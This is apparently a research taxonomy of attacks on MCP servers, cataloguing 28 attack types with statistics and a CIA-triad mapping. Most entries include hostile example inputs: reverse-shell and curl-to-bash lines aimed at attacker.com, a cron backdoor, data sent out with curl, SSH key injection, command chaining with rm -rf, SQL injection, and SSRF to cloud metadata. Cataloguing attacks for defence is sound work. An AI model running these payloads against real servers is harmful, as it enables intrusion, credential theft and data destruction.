# MCP Server Attack Taxonomy

> **Threat model:** The MCP **server is the protected asset**. A malicious user — acting through an AI agent or directly — sends harmful requests to the server's tools that damage the server itself.
>
> This document does **not** cover attacks on the agent (e.g., tool poisoning that tricks the agent). The server is always the victim here.
>
> Sources: 22 benchmark reviews from the literature survey.

---

## Part 1 — Complete Attack List

---

### 1. Code Execution on the Server

#### 1.1 Arbitrary Code Execution via Tool Parameters

| Field | Detail |
|-------|--------|
| **Description** | Malicious user crafts tool parameters that cause the server to execute arbitrary code. |
| **Example** | Server exposes `execute_script(script_path)`. User sends: `execute_script("/tmp/payload.sh")` where the file contains `curl attacker.com/malware | bash`. The server's process executes the attacker's code. |
| **Server damage** | Server process compromised; attacker code runs with server's privileges |
| **Source** | DVMCP Challenge 8; MCP Safety Audit; MCP-SafetyBench |
| **ASR** | Demonstrated on Claude 3.7 Sonnet and Llama-3.3-70B |
| **Detection** | **High** |

#### 1.2 Reverse Shell

| Field | Detail |
|-------|--------|
| **Description** | Attacker injects a reverse-shell payload through a tool parameter, opening a persistent backdoor on the server. |
| **Example** | User sends tool input containing: `bash -i >& /dev/tcp/attacker.com/4444 0>&1`. The server executes it and opens an outbound shell connection to the attacker, giving them interactive access to the server machine. |
| **Server damage** | Full interactive access to server host; attacker can run any command |
| **Source** | MCP Safety Audit; DVMCP; MCP-SafetyBench |
| **ASR** | ~27 % (host-side attacks, MCPSecBench) |
| **Detection** | **High** |

#### 1.3 Command Injection via Parameter Chaining

| Field | Detail |
|-------|--------|
| **Description** | Tool parameter is not sanitized; attacker chains OS commands using `&&`, `;`, or `|`. |
| **Example** | Server tool: `list_directory(path)`. User sends: `list_directory("/tmp && rm -rf /var/data")`. The server's subprocess executes both the listing and the deletion. Real CVE: **CVE-2025-6514** (arbitrary OS command execution in `mcp-remote`). |
| **Server damage** | Server files deleted/modified; arbitrary commands executed on server |
| **Source** | MCPSecBench; DVMCP |
| **ASR** | 100 % (protocol-surface attacks, MCPSecBench) |
| **Detection** | **Medium** — detectable via input sanitization |

#### 1.4 Initialization Injection

| Field | Detail |
|-------|--------|
| **Description** | Malicious code is injected into the server's startup routine, so it executes every time the server boots. |
| **Example** | Attacker modifies the server's `__init__` hook to include `os.system("curl attacker.com/beacon")`. Every time the server starts, it phones home and can download further payloads. 7 malicious initialization variants documented. |
| **Server damage** | Persistent server compromise from first boot; backdoor survives restarts |
| **Source** | Component-based Attack PoC (Zhao et al., 2025) |
| **ASR** | mcp-scan detected only 3.3 % (4/120) of these attacks |
| **Detection** | **Very High** — often missed by static scanners |

---

### 2. Unauthorized Server Filesystem Access

#### 2.1 Path Traversal (Unauthorized File Read)

| Field | Detail |
|-------|--------|
| **Description** | User crafts a file path that escapes the intended directory, reading sensitive server files. |
| **Example** | Server tool: `read_file(path)` intended for `/home/user/documents/`. User sends: `read_file("../../../../etc/passwd")`. The server reads and returns its own system password file. |
| **Server damage** | Server system files exposed; configuration, user lists, sensitive data leaked |
| **Source** | MCPSecBench (server-side attacks); DVMCP |
| **ASR** | ~47 % (server-side attacks, MCPSecBench) |
| **Detection** | **Medium** |

#### 2.2 Unauthorized File Write / Modification

| Field | Detail |
|-------|--------|
| **Description** | User writes or modifies files on the server's filesystem outside the intended scope. |
| **Example** | Server tool: `write_file(path, content)`. User sends: `write_file("/etc/cron.d/backdoor", "* * * * * root curl attacker.com/payload | bash")`. The server writes a cron job that runs every minute as root. |
| **Server damage** | Server filesystem corrupted; persistent backdoor installed; configuration tampered |
| **Source** | MCP-SafetyBench; MCP Safety Audit |
| **ASR** | — |
| **Detection** | **Medium** |

#### 2.3 SSH Key Injection

| Field | Detail |
|-------|--------|
| **Description** | Attacker uses the server's file-write tool to inject their SSH public key into the server's `authorized_keys`. |
| **Example** | User sends: `write_file("~/.ssh/authorized_keys", "ssh-rsa AAAA...attackerkey...")`. The server writes the key. Attacker now has persistent SSH access to the server machine, independent of the MCP protocol. |
| **Server damage** | Persistent remote access to server host; survives server restarts and MCP shutdowns |
| **Source** | MCP Safety Audit; DVMCP Challenge 10; MCP-SafetyBench |
| **ASR** | Demonstrated on Claude 3.7 and Llama-3.3-70B |
| **Detection** | **High** |

#### 2.4 Log Tampering / Evidence Destruction

| Field | Detail |
|-------|--------|
| **Description** | Attacker uses file-write/delete tools to erase or modify the server's audit logs, covering their tracks. |
| **Example** | After exfiltrating data, user sends: `delete_file("/var/log/mcp_server.log")` or overwrites the log file with benign entries. The server loses its audit trail. |
| **Server damage** | Server loses forensic evidence; future attacks become harder to detect |
| **Source** | MCP-SafetyBench; Component-based Attack PoC |
| **ASR** | — |
| **Detection** | **Medium** |

---

### 3. Credential and Secret Theft from the Server

#### 3.1 API Key / Token Extraction

| Field | Detail |
|-------|--------|
| **Description** | Attacker uses server tools to read files or environment variables that contain the server's own credentials. |
| **Example** | User sends: `read_file("/home/server/.env")` and gets back `DATABASE_URL=postgres://admin:s3cret@db:5432/prod` and `AWS_SECRET_ACCESS_KEY=AKIA...`. The server's own secrets are now in the attacker's hands. Real data: **9 PATs and 3 API keys** found leaked in the MCP ecosystem. |
| **Server damage** | Server's credentials for external services stolen; lateral movement enabled |
| **Source** | MCP Server Dataset 67K; MCP Server Database; MCP-SafetyBench |
| **ASR** | Active exploitation documented (9 PATs + 3 API keys found in wild) |
| **Detection** | **Medium** |

#### 3.2 Environment Variable Exposure

| Field | Detail |
|-------|--------|
| **Description** | Attacker triggers the server to reveal its environment variables, which often contain secrets. |
| **Example** | User asks the agent to "debug a config issue." Agent uses server's execution tool to run `printenv` or reads `/proc/self/environ` on the server. Output reveals `STRIPE_SECRET_KEY`, `JWT_SECRET`, `DB_PASSWORD`. |
| **Server damage** | All secrets stored in server's environment exposed at once |
| **Source** | MCP-SafetyBench |
| **ASR** | — |
| **Detection** | **Medium** |

#### 3.3 Database Credential Extraction

| Field | Detail |
|-------|--------|
| **Description** | Attacker reads server-side config files that contain database connection strings or credentials. |
| **Example** | User sends: `read_file("/app/config/database.yml")`. Server returns its own database host, username, password. Attacker can now connect to the server's database directly, bypassing MCP entirely. |
| **Server damage** | Direct database access granted; entire data store at risk |
| **Source** | MCP-SafetyBench; MCP Safety Audit |
| **ASR** | — |
| **Detection** | **Medium** |

---

### 4. Server Database Attacks

#### 4.1 SQL Injection via Tool Parameters

| Field | Detail |
|-------|--------|
| **Description** | Server tool passes user input into a SQL query without sanitization. Attacker injects SQL to read, modify, or delete data. |
| **Example** | Server tool: `search_users(name)`. User sends: `search_users("'; DROP TABLE users; --")`. The server's database executes the DROP command, destroying the users table. |
| **Server damage** | Server database corrupted or destroyed; data loss |
| **Source** | MCIP-Bench (Data Injection category, 9.8 % of training data); MCPSecBench |
| **ASR** | — |
| **Detection** | **Medium** — well-known defense techniques exist |

#### 4.2 Data Exfiltration via Query Abuse

| Field | Detail |
|-------|--------|
| **Description** | User crafts queries that extract more data than the tool intended to return. |
| **Example** | Server tool: `get_user_profile(user_id)` intended to return name and email. User sends: `get_user_profile("1 UNION SELECT credit_card, ssn FROM sensitive_data")`. Server returns sensitive records alongside the legitimate profile. |
| **Server damage** | Server's protected data exfiltrated beyond intended scope |
| **Source** | MCIP-Bench; MCP-SafetyBench |
| **ASR** | — |
| **Detection** | **Medium** |

#### 4.3 State Corruption

| Field | Detail |
|-------|--------|
| **Description** | Attacker modifies the server's internal state (database, cache, configuration) through repeated or malicious tool calls. |
| **Example** | User repeatedly calls `update_config(key, value)` with conflicting values, leaving the server in an inconsistent state. Or user calls `delete_record(id)` on critical system records that the server depends on. |
| **Server damage** | Server internal consistency violated; unpredictable behavior |
| **Source** | MCP-SafetyBench |
| **ASR** | — |
| **Detection** | **High** |

---

### 5. Privilege and Scope Escalation on the Server

#### 5.1 Excessive Privilege Exploitation

| Field | Detail |
|-------|--------|
| **Description** | Server tools run with overly broad permissions. User exploits the excess to access server resources beyond intended scope. |
| **Example** | Server runs all tools as `root`. User calls `read_file("/etc/shadow")` — which succeeds because the server process has root access, even though the tool was only meant for user-level file reading. Real data: MiniScope found 100 % permission mismatch in vanilla configurations. |
| **Server damage** | Server resources exposed far beyond intended scope; root-level access abused |
| **Source** | MiniScope; DVMCP Challenge 3 (Excessive Permission Scope); MCP-SafetyBench |
| **ASR** | Vanilla baseline: 100 % permission mismatch |
| **Detection** | **Medium** |

#### 5.2 Out-of-Scope Parameter Injection

| Field | Detail |
|-------|--------|
| **Description** | User sends parameters the tool accepts but that go beyond intended authorization, causing the server to perform privileged operations. |
| **Example** | Tool: `read_file(path, role="user")`. User sends: `read_file("/etc/shadow", role="admin")`. Server does not validate the `role` parameter and reads the file with admin privileges. |
| **Server damage** | Server performs privileged operations it should not allow |
| **Source** | MSB (Zhang et al., Oct 2025) |
| **ASR** | **74.03 %** (highest in MSB) |
| **Detection** | **High** |

#### 5.3 Privilege Escalation via Tool Chaining

| Field | Detail |
|-------|--------|
| **Description** | User chains multiple individually benign server tools to achieve an action that none of them should allow alone. |
| **Example** | Step 1: `read_file("/etc/sudoers")` — reads who has sudo. Step 2: `write_file("/etc/sudoers", modified_content)` — grants attacker sudo. Step 3: `execute("sudo cat /etc/shadow")` — reads all password hashes. Each step alone looks benign; the chain compromises the server. |
| **Server damage** | Server privileges escalated; full system compromise |
| **Source** | Component-based Attack PoC (Zhao et al., 2025); MCP Server Database |
| **ASR** | **90 %** across 10 constructed parasitic toolchains; 27.2 % of real servers expose exploitable combinations |
| **Detection** | **Very High** — mcp-scan caught only 3.3 % |

---

### 6. Server Availability Attacks

#### 6.1 Resource Exhaustion (CPU / Memory)

| Field | Detail |
|-------|--------|
| **Description** | User sends requests that consume excessive server CPU or memory, degrading service for all users. |
| **Example** | User calls `execute("while true; do echo 'a'; done")` or sends a tool request that triggers an infinite loop in server-side processing. Server CPU pins to 100 % and stops responding. |
| **Server damage** | Server becomes unresponsive; denial of service for legitimate users |
| **Source** | MCPSecBench; MCP-SafetyBench |
| **ASR** | 30–50 % |
| **Detection** | **Low** — noisy and obvious, but hard to stop mid-attack |

#### 6.2 Disk Exhaustion

| Field | Detail |
|-------|--------|
| **Description** | User repeatedly writes large files to the server's filesystem until disk space is full. |
| **Example** | User calls `write_file("/tmp/junk_N.bin", "A" * 1_000_000_000)` in a loop. Server's disk fills up, causing log failures, database crashes, and service outage. |
| **Server damage** | Server disk full; logging stops, database crashes, tools fail |
| **Source** | MCP-SafetyBench |
| **ASR** | — |
| **Detection** | **Low** |

#### 6.3 Forced Server Shutdown / Rug Pull

| Field | Detail |
|-------|--------|
| **Description** | Attacker sends a request that causes the server process to terminate. |
| **Example** | User sends tool input that triggers `sys.exit()`, `os.kill(os.getpid(), 9)`, or an unhandled exception that crashes the server. All connected agents lose access. |
| **Server damage** | Server process terminated; service outage; connected sessions lost |
| **Source** | DVMCP Challenge 5 (Rug Pull) |
| **ASR** | — |
| **Detection** | **Medium** |

---

### 7. Sandbox Escape

#### 7.1 Container / Sandbox Breakout

| Field | Detail |
|-------|--------|
| **Description** | Server runs in a sandbox (Docker, VM, chroot). Attacker exploits a vulnerability to break out and access the host. |
| **Example** | Server runs inside Docker. User sends: `execute("docker run -v /:/host --privileged alpine cat /host/etc/shadow")` or exploits a mounted Docker socket to escape the container and access the host filesystem. |
| **Server damage** | Server's isolation breached; host machine compromised |
| **Source** | MCPSecBench (protocol-side attacks) |
| **ASR** | 100 % (protocol-side, MCPSecBench) |
| **Detection** | **Very High** |

---

### 8. Network-Level Attacks on the Server

#### 8.1 SSRF (Server-Side Request Forgery)

| Field | Detail |
|-------|--------|
| **Description** | User tricks the server into making HTTP requests to internal endpoints that are not publicly accessible. |
| **Example** | Server tool: `fetch_url(url)`. User sends: `fetch_url("http://169.254.169.254/latest/meta-data/iam/security-credentials/")`. The server fetches its own cloud metadata, exposing IAM credentials. |
| **Server damage** | Server's internal network exposed; cloud credentials leaked |
| **Source** | MCPSecBench; MCP-SafetyBench |
| **ASR** | — |
| **Detection** | **High** |

#### 8.2 DNS Rebinding

| Field | Detail |
|-------|--------|
| **Description** | Attacker controls a domain whose DNS initially resolves to an external IP, then rebinds to an internal IP the server can reach. |
| **Example** | User sends: `fetch_url("http://evil.com/data")`. First DNS lookup returns the attacker's IP (passes security check). Second lookup rebinds to `192.168.1.1` (internal database server). Server now sends requests to its own internal network. |
| **Server damage** | Server's internal network accessed through DNS trick |
| **Source** | MCPSecBench |
| **ASR** | 100 % (protocol surface) |
| **Detection** | **Very High** |

#### 8.3 Protocol-Level Exploitation

| Field | Detail |
|-------|--------|
| **Description** | Attacker sends malformed or specially crafted MCP protocol messages that exploit vulnerabilities in the server's protocol handling. |
| **Example** | Attacker sends a JSON-RPC message with an oversized payload, recursive nested objects, or malformed headers that cause the server's parser to crash or behave unpredictably. |
| **Server damage** | Server crashes, hangs, or enters undefined state |
| **Source** | MCPSecBench |
| **ASR** | 100 % (protocol-side attacks have zero effective defense) |
| **Detection** | **Very High** |

---

### 9. Server Identity and Registry Attacks

#### 9.1 Server Hijacking (Registry Takeover)

| Field | Detail |
|-------|--------|
| **Description** | Attacker takes over a legitimate server's entry in an MCP registry, replacing it with a malicious version. |
| **Example** | Legitimate server `safe_database_v1` is registered on Pulse MCP. Attacker gains control of the registry entry and replaces the server code with a version that exfiltrates all data passing through it. Users download the hijacked version unknowingly. **111+ hijacking instances documented.** |
| **Server damage** | Server identity stolen; all users of the server are now connecting to attacker's code |
| **Source** | MCP Server Dataset 67K; MCP Server Database |
| **ASR** | 111+ documented instances |
| **Detection** | **High** |

#### 9.2 Supply-Chain Poisoning (Malicious Dependencies)

| Field | Detail |
|-------|--------|
| **Description** | Attacker compromises a library the server depends on, injecting malicious code that runs when the server starts. |
| **Example** | Server depends on `mcp-utils` package. Attacker publishes a malicious version `mcp-utils` on npm with a post-install script that steals the server's credentials. Server operator updates dependencies and is compromised. |
| **Server damage** | Server compromised through its own dependency chain |
| **Source** | MCP Server Dataset 67K (6.75 % invalid link rate indicating ecosystem decay) |
| **ASR** | — |
| **Detection** | **Very High** |

---

### 10. Replay and Temporal Attacks on the Server

#### 10.1 Replay Attack

| Field | Detail |
|-------|--------|
| **Description** | Attacker captures a valid tool request and replays it to cause the server to repeat an action. |
| **Example** | Attacker captures a valid `transfer_funds(amount=1000, to=account_X)` request. Later, attacker replays the exact same request. Server processes it again, causing a duplicate transfer. |
| **Server damage** | Server performs duplicate/unauthorized operations; financial loss, data duplication |
| **Source** | MCIP-Bench (Replay Injection, 9.9 % of test cases); MCP-SafetyBench |
| **ASR** | 9.9 % |
| **Detection** | **High** |

#### 10.2 Session Abuse / Temporal Risk Accumulation

| Field | Detail |
|-------|--------|
| **Description** | Over a long session, user gradually escalates the scope of tool requests. Each individual request looks benign but the cumulative effect is harmful. |
| **Example** | Turn 1: `list_files("/data/")` (benign listing). Turn 5: `read_file("/data/users.csv")` (reads data). Turn 10: `read_file("/data/credentials.json")` (reads secrets). Turn 15: `write_file("/tmp/exfil.txt", all_data)` + `execute("curl attacker.com -d @/tmp/exfil.txt")`. Each step looks like a small increment; the full chain is a complete data breach. |
| **Server damage** | Server data progressively exfiltrated over time; harder to detect than a single large request |
| **Source** | MCP-SafetyBench; MCPShield |
| **ASR** | Increases with session length |
| **Detection** | **Very High** — requires session-aware monitoring |

---

## Part 2 — CIA-Based Taxonomy

```
CIA Triad — Attacks on the MCP Server
│
├── C  CONFIDENTIALITY — unauthorized disclosure of server data/secrets
│   │
│   ├── C1  Filesystem Data Exposure
│   │   ├── 2.1  Path Traversal (reading server files outside intended scope)
│   │   └── 2.4  Log Tampering (reading logs before destroying them)
│   │
│   ├── C2  Credential & Secret Theft
│   │   ├── 3.1  API Key / Token Extraction
│   │   ├── 3.2  Environment Variable Exposure
│   │   └── 3.3  Database Credential Extraction
│   │
│   ├── C3  Database Data Exfiltration
│   │   └── 4.2  Data Exfiltration via Query Abuse (UNION injection, scope bypass)
│   │
│   ├── C4  Network-Based Disclosure
│   │   ├── 8.1  SSRF (server fetches internal/cloud metadata)
│   │   └── 8.2  DNS Rebinding (server accesses internal network)
│   │
│   └── C5  Gradual / Session-Based Exfiltration
│       └── 10.2 Session Abuse (progressive data extraction over time)
│
├── I  INTEGRITY — unauthorized modification of server state/behavior
│   │
│   ├── I1  Code Execution (server runs attacker's code)
│   │   ├── 1.1  Arbitrary Code Execution via Tool Parameters
│   │   ├── 1.2  Reverse Shell
│   │   ├── 1.3  Command Injection via Parameter Chaining
│   │   └── 1.4  Initialization Injection (malicious startup code)
│   │
│   ├── I2  Filesystem Modification
│   │   ├── 2.2  Unauthorized File Write / Modification
│   │   ├── 2.3  SSH Key Injection (persistent backdoor)
│   │   └── 2.4  Log Tampering / Evidence Destruction
│   │
│   ├── I3  Database Corruption
│   │   ├── 4.1  SQL Injection (DROP TABLE, UPDATE abuse)
│   │   └── 4.3  State Corruption (inconsistent server state)
│   │
│   ├── I4  Privilege Escalation
│   │   ├── 5.1  Excessive Privilege Exploitation
│   │   ├── 5.2  Out-of-Scope Parameter Injection
│   │   └── 5.3  Privilege Escalation via Tool Chaining
│   │
│   └── I5  Identity & Supply Chain
│       ├── 9.1  Server Hijacking (registry takeover)
│       └── 9.2  Supply-Chain Poisoning (malicious dependencies)
│
├── A  AVAILABILITY — disruption of server operation
│   │
│   ├── A1  Resource Exhaustion
│   │   ├── 6.1  CPU / Memory Exhaustion
│   │   └── 6.2  Disk Exhaustion
│   │
│   ├── A2  Service Termination
│   │   └── 6.3  Forced Server Shutdown / Rug Pull
│   │
│   ├── A3  Isolation Breach
│   │   └── 7.1  Container / Sandbox Breakout
│   │
│   └── A4  Protocol-Level Disruption
│       └── 8.3  Protocol-Level Exploitation (malformed messages crash server)
│
└── CROSS-CUTTING (spans 2+ pillars)
    │
    ├── [C + I] Unauthorized Access Chains
    │   ├── 5.3  Tool Chaining (read secrets → escalate → modify)
    │   └── 10.2 Session Abuse (read → read more → exfiltrate → cover tracks)
    │
    ├── [C + A] Network Exploitation
    │   ├── 8.1  SSRF (leaks data AND can cause internal service disruption)
    │   └── 8.2  DNS Rebinding (leaks data AND enables internal attacks)
    │
    ├── [I + A] Destructive Execution
    │   ├── 1.2  Reverse Shell (modifies state AND can shut down server)
    │   ├── 1.3  Command Injection (modifies files AND can crash server)
    │   └── 7.1  Sandbox Escape (breaches isolation AND compromises host)
    │
    └── [C + I + A] Full Compromise
        ├── 9.1  Server Hijacking (exposes data + corrupts server + kills availability)
        └── 10.1 Replay Attack (re-executes operations: leaks, corrupts, and exhausts)
```

---

### CIA Mapping — Summary Table

| # | Attack | C | I | A | Primary |
|---|--------|:-:|:-:|:-:|---------|
| 1.1 | Arbitrary Code Execution | | **X** | | Integrity |
| 1.2 | Reverse Shell | | **X** | **X** | Integrity |
| 1.3 | Command Injection | | **X** | **X** | Integrity |
| 1.4 | Initialization Injection | | **X** | | Integrity |
| 2.1 | Path Traversal | **X** | | | Confidentiality |
| 2.2 | Unauthorized File Write | | **X** | | Integrity |
| 2.3 | SSH Key Injection | | **X** | | Integrity |
| 2.4 | Log Tampering | **X** | **X** | | Cross-Cutting |
| 3.1 | API Key / Token Extraction | **X** | | | Confidentiality |
| 3.2 | Environment Variable Exposure | **X** | | | Confidentiality |
| 3.3 | Database Credential Extraction | **X** | | | Confidentiality |
| 4.1 | SQL Injection | | **X** | | Integrity |
| 4.2 | Data Exfiltration via Query | **X** | | | Confidentiality |
| 4.3 | State Corruption | | **X** | | Integrity |
| 5.1 | Excessive Privilege Exploitation | **X** | **X** | | Cross-Cutting |
| 5.2 | Out-of-Scope Parameter Injection | **X** | **X** | | Cross-Cutting |
| 5.3 | Privilege Escalation via Chaining | **X** | **X** | | Cross-Cutting |
| 6.1 | CPU / Memory Exhaustion | | | **X** | Availability |
| 6.2 | Disk Exhaustion | | | **X** | Availability |
| 6.3 | Forced Shutdown / Rug Pull | | | **X** | Availability |
| 7.1 | Sandbox Escape | | **X** | **X** | Cross-Cutting |
| 8.1 | SSRF | **X** | | **X** | Cross-Cutting |
| 8.2 | DNS Rebinding | **X** | | **X** | Cross-Cutting |
| 8.3 | Protocol-Level Exploitation | | | **X** | Availability |
| 9.1 | Server Hijacking | **X** | **X** | **X** | Cross-Cutting |
| 9.2 | Supply-Chain Poisoning | | **X** | | Integrity |
| 10.1 | Replay Attack | **X** | **X** | **X** | Cross-Cutting |
| 10.2 | Session Abuse | **X** | **X** | | Cross-Cutting |

---

### Pillar Statistics

| CIA Pillar | Attack Count | % of 28 |
|------------|:-----------:|:-------:|
| **Confidentiality** (total touches) | 15 | 54 % |
| **Integrity** (total touches) | 19 | 68 % |
| **Availability** (total touches) | 12 | 43 % |
| Pure Confidentiality only | 6 | 21 % |
| Pure Integrity only | 7 | 25 % |
| Pure Availability only | 4 | 14 % |
| Cross-Cutting (2+ pillars) | 11 | 39 % |

> **Key insight:** When the server is the victim, the CIA distribution is more balanced than agent-side attacks. Integrity still leads (68 %) because code execution and file modification are the most common server-side threats. Confidentiality is close behind (54 %) because servers store credentials, data, and configs that attackers want to steal. Availability is significantly higher (43 % vs 26 % in agent-side) because server resources (CPU, disk, process) can be directly exhausted or crashed.

---

### Attack Surface × ASR Summary

| Attack Surface | ASR | Source |
|----------------|:---:|--------|
| Protocol-side (malformed messages, DNS) | **100 %** | MCPSecBench |
| Server-side (file access, command exec) | **~47 %** | MCPSecBench |
| Host-side (reverse shell, sandbox escape) | **~27 %** | MCPSecBench |
| Out-of-scope parameters | **74.03 %** | MSB |
| Parasitic toolchains (multi-tool chaining) | **90 %** | MCP Server Database |
| Replay injection | **9.9 %** | MCIP-Bench |
| Initialization injection evasion | **96.7 %** evasion | Component PoC |

---

*Document generated from 22 benchmark reviews. See `Benchmark/benchmark_md/` for full source details.*
